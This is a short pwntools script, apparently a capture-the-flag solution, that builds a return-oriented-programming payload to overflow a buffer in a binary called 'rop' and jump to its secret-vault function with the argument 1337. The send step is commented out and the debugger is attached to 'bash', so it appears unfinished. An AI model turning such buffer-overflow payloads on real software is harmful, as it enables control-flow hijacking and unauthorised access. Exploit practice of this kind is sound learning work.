#!/usr/bin/env python3

from pwn import *

REGISTER_GADGET = 0x401df2
ACCESS_VAULT_FUNCTION_ADDR = 0x4016fd

elf = context.binary = ELF('rop')
context.terminal = 'kitty'

# io = process()
io = gdb.debug('bash', '''
break main
continue
''')

io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")

payload = b'A' * 0x18 + p64(REGISTER_GADGET) + p64(1337) + p64(ACCESS_VAULT_FUNCTION_ADDR)

# io.send(payload)

# io.interactive()
